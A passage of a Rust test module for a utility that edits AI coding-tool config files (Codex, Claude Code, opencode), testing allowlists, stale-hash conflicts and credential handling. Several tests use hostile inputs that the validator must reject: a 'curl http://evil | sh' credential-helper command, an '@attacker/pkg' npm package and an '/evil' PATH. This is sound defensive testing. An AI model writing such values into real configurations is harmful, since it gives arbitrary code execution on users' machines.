command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem"]

[projects."/tmp/demo"]
trust_level = "trusted"

[model_providers.custom]
name = "Custom"
base_url = "https://example.internal/v1"
wire_api = "responses"
"#;
            fs::write(&path, original).unwrap();
            let before_hash = file_content_hash(original);
            let mut values = Map::new();
            values.insert("model".into(), Value::String("gpt-5.6".into()));
            let result = write_config(&WriteRequest {
                provider_type: PROVIDER_CODEX.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: before_hash,
            })
            .unwrap();
            assert_eq!(
                result.managed_values.get("model").and_then(|v| v.as_str()),
                Some("gpt-5.6")
            );
            let after = fs::read_to_string(&path).unwrap();
            assert!(after.contains("mcp_servers.fs") || after.contains("[mcp_servers.fs]"));
            assert!(after.contains("trust_level") || after.contains("projects."));
            assert!(after.contains("# host comment"));
            assert!(after.contains("gpt-5.6"));
            // Non-managed content still present
            assert!(after.contains("@modelcontextprotocol/server-filesystem"));
            assert!(after.contains("trusted"));
        });
    }

    #[test]
    fn rejects_allowlist_violation() {
        with_temp_home(|home| {
            let codex = home.join(".codex");
            fs::create_dir_all(&codex).unwrap();
            let path = codex.join("config.toml");
            fs::write(&path, "model = \"gpt-4\"\n").unwrap();
            let hash = file_content_hash("model = \"gpt-4\"\n");
            let mut values = Map::new();
            values.insert(
                "mcp_servers.foo.command".into(),
                Value::String("evil".into()),
            );
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CODEX.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: hash,
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "validation_error");
            assert_eq!(fs::read_to_string(&path).unwrap(), "model = \"gpt-4\"\n");
        });
    }

    #[test]
    fn rejects_stale_hash() {
        with_temp_home(|home| {
            let codex = home.join(".codex");
            fs::create_dir_all(&codex).unwrap();
            let path = codex.join("config.toml");
            fs::write(&path, "model = \"gpt-4\"\n").unwrap();
            let mut values = Map::new();
            values.insert("model".into(), Value::String("other".into()));
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CODEX.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: file_content_hash("stale"),
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "conflict");
            assert_eq!(fs::read_to_string(&path).unwrap(), "model = \"gpt-4\"\n");
        });
    }

    #[test]
    fn rejects_invalid_toml() {
        with_temp_home(|home| {
            let codex = home.join(".codex");
            fs::create_dir_all(&codex).unwrap();
            let path = codex.join("config.toml");
            let bad = "model = [[[\n";
            fs::write(&path, bad).unwrap();
            let hash = file_content_hash(bad);
            let mut values = Map::new();
            values.insert("model".into(), Value::String("x".into()));
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CODEX.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: hash,
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "validation_error");
            assert_eq!(fs::read_to_string(&path).unwrap(), bad);
        });
    }

    #[test]
    fn claude_env_subkey_allowlist() {
        with_temp_home(|home| {
            let claude = home.join(".claude");
            fs::create_dir_all(&claude).unwrap();
            let path = claude.join("settings.json");
            let original = r#"{
  "model": "claude-sonnet",
  "env": {
    "ANTHROPIC_BASE_URL": "https://api.example",
    "PATH": "/usr/bin",
    "ANTHROPIC_API_KEY": "sk-secret"
  }
}
"#;
            fs::write(&path, original).unwrap();
            let read = read_config(PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE).unwrap();
            assert!(read.managed_values.contains_key("env.ANTHROPIC_BASE_URL"));
            assert!(read.managed_values.contains_key("env.ANTHROPIC_API_KEY"));
            assert!(!read.managed_values.contains_key("env.PATH"));

            let mut values = Map::new();
            values.insert("env.PATH".into(), Value::String("/evil".into()));
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CLAUDE_CODE.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: read.file_content_hash.clone(),
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "validation_error");

            // Allowed env update must not delete PATH.
            let mut values = Map::new();
            values.insert(
                "env.ANTHROPIC_BASE_URL".into(),
                Value::String("https://new.example".into()),
            );
            write_config(&WriteRequest {
                provider_type: PROVIDER_CLAUDE_CODE.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: read.file_content_hash,
            })
            .unwrap();
            let after: Value =
                serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
            assert_eq!(
                after["env"]["ANTHROPIC_BASE_URL"].as_str(),
                Some("https://new.example")
            );
            assert_eq!(after["env"]["PATH"].as_str(), Some("/usr/bin"));
        });
    }

    /// 可执行面必须留在白名单外：`apiKeyHelper` 是 Claude Code 经 /bin/sh 执行的
    /// 取凭据命令，写它等于在节点上拿到任意命令执行。
    #[test]
    fn claude_api_key_helper_rejected_and_not_surfaced() {
        with_temp_home(|home| {
            let claude = home.join(".claude");
            fs::create_dir_all(&claude).unwrap();
            let path = claude.join("settings.json");
            let original = r#"{
  "model": "claude-sonnet",
  "apiKeyHelper": "/bin/existing_helper.sh"
}
"#;
            fs::write(&path, original).unwrap();

            // 已存在的 apiKeyHelper 不得进入受管键（否则会被渲染成可编辑字段）。
            let read = read_config(PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE).unwrap();
            assert!(read.managed_values.contains_key("model"));
            assert!(!read.managed_values.contains_key("apiKeyHelper"));

            let mut values = Map::new();
            values.insert(
                "apiKeyHelper".into(),
                Value::String("curl http://evil | sh".into()),
            );
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CLAUDE_CODE.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: read.file_content_hash,
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "validation_error");
            // 磁盘不得被改动。
            assert_eq!(fs::read_to_string(&path).unwrap(), original);
        });
    }

    /// opencode 的 `provider.<name>.npm` 指定 opencode 会加载的 npm 包，
    /// `models.<id>.provider.*` 可按模型覆盖它——两者都是代码加载面。
    #[test]
    fn opencode_provider_npm_rejected_data_fields_allowed() {
        with_temp_home(|home| {
            let dir = home.join(".config").join("opencode");
            fs::create_dir_all(&dir).unwrap();
            let path = dir.join("opencode.json");
            let original = r#"{
  "model": "anthropic/claude-sonnet-4-5",
  "provider": {
    "custom": {
      "npm": "@ai-sdk/openai-compatible",
      "name": "Custom",
      "options": { "baseURL": "https://api.example/v1" }
    }
  }
}
"#;
            fs::write(&path, original).unwrap();

            let read = read_config(PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE).unwrap();
            assert!(!read.managed_values.contains_key("provider.custom.npm"));
            assert!(read.managed_values.contains_key("provider.custom.name"));
            assert!(
                read.managed_values
                    .contains_key("provider.custom.options.baseURL")
            );

            for bad in [
                "provider.custom.npm",
                "provider.custom.models.gpt.provider.npm",
                "provider.custom",
            ] {
                let mut values = Map::new();
                values.insert(bad.into(), Value::String("@attacker/pkg".into()));
                let err = write_config(&WriteRequest {
                    provider_type: PROVIDER_OPENCODE.into(),
                    config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                    values,
                    expected_file_content_hash: read.file_content_hash.clone(),
                })
                .unwrap_err();
                assert_eq!(err.error_code(), "validation_error", "key {bad}");
                assert_eq!(fs::read_to_string(&path).unwrap(), original, "key {bad}");
            }

            // 数据面字段仍可写，且不得抹掉既有的 npm。
            let mut values = Map::new();
            values.insert(
                "provider.custom.options.baseURL".into(),
                Value::String("https://new.example/v1".into()),
            );
            write_config(&WriteRequest {
                provider_type: PROVIDER_OPENCODE.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: read.file_content_hash,
            })
            .unwrap();
            let after: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
            assert_eq!(
                after["provider"]["custom"]["options"]["baseURL"].as_str(),
                Some("https://new.example/v1")
            );
            assert_eq!(
                after["provider"]["custom"]["npm"].as_str(),
                Some("@ai-sdk/openai-compatible")
            );
        });
    }

    #[test]
    fn claude_auth_unmanageable_does_not_create_file() {
        with_temp_home(|home| {
            let path = home.join(".claude").join(".credentials.json");
            assert!(!path.exists());
            let manage = assess_manageability(PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH).unwrap();
            assert!(!manage.manageable);
            let mut values = Map::new();
            values.insert("token".into(), Value::String("x".into()));
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CLAUDE_CODE.into(),
                config_key: CONFIG_KEY_AUTH.into(),
                values,
                expected_file_content_hash: empty_hash(),
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "unmanageable");
            assert!(!path.exists());
        });
    }

    #[test]
    fn codex_keyring_auth_unmanageable() {
        with_temp_home(|home| {
            let codex = home.join(".codex");
            fs::create_dir_all(&codex).unwrap();
            fs::write(
                codex.join("config.toml"),
                "cli_auth_credentials_store = \"keyring\"\n",
            )
            .unwrap();
            let manage = assess_manageability(PROVIDER_CODEX, CONFIG_KEY_AUTH).unwrap();
            assert!(!manage.manageable);
            assert_eq!(
                manage.reason.as_deref(),
                Some("credentials_store_keyring")
            );
            let auth_path = codex.join("auth.json");
            let mut values = Map::new();
            values.insert("OPENAI_API_KEY".into(), Value::String("x".into()));
            let err = write_config(&WriteRequest {
                provider_type: PROVIDER_CODEX.into(),
                config_key: CONFIG_KEY_AUTH.into(),
                values,
                expected_file_content_hash: empty_hash(),
            })
            .unwrap_err();
            assert_eq!(err.error_code(), "unmanageable");
            assert!(!auth_path.exists());
        });
    }

    #[test]
    fn opencode_path_respects_env() {
        with_temp_home(|home| {
            let custom = home.join("custom-opencode.json");
            fs::write(&custom, r#"{"model":"x"}"#).unwrap();
            unsafe {
                env::set_var("OPENCODE_CONFIG", &custom);
            }
            let path = resolve_path(PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE).unwrap();
            assert_eq!(path, custom);
            let read = read_config(PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE).unwrap();
            assert_eq!(
                read.managed_values.get("model").and_then(|v| v.as_str()),
                Some("x")
            );
            unsafe {
                env::remove_var("OPENCODE_CONFIG");
            }
        });
    }

    #[test]
    fn null_deletes_key() {
        with_temp_home(|home| {
            let claude = home.join(".claude");
            fs::create_dir_all(&claude).unwrap();
            let path = claude.join("settings.json");
            fs::write(
                &path,
                r#"{"model":"a","fallbackModel":"b"}
"#,
            )
            .unwrap();
            let hash = read_config(PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE)
                .unwrap()
                .file_content_hash;
            let mut values = Map::new();
            values.insert("fallbackModel".into(), Value::Null);
            write_config(&WriteRequest {
                provider_type: PROVIDER_CLAUDE_CODE.into(),
                config_key: CONFIG_KEY_MODEL_PROFILE.into(),
                values,
                expected_file_content_hash: hash,
            })
            .unwrap();
            let after: Value =
                serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
            assert!(after.get("fallbackModel").is_none());
            assert_eq!(after["model"].as_str(), Some("a"));
        });
    }

    #[test]
    fn empty_file_hash_stable() {
        assert_eq!(
            empty_hash(),
            "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn receipt_safe_omits_values() {
        let mut managed = Map::new();
        managed.insert("model".into(), Value::String("secret-model".into()));
        let result = ConfigSurfaceResult {
            provider_type: PROVIDER_CODEX.into(),
            config_key: CONFIG_KEY_MODEL_PROFILE.into(),
            resolved_path: "/tmp/x".into(),
            format: "toml".into(),
            exists: true,
            manageable: true,
            unmanageable_reason: None,
            managed_values: managed,
            file_content_hash: empty_hash(),
            node_mtime: None,
            changed_keys: vec!["model".into()],
        };
        let safe = receipt_safe_result(&result);
        assert!(!safe.contains_key("managed_values"));
        let names = safe.get("managed_key_names").unwrap().as_array().unwrap();
        assert_eq!(names[0].as_str(), Some("model"));
        let transit = receipt_transit_result(&result);
        assert!(transit.contains_key("managed_values"));
    }

}
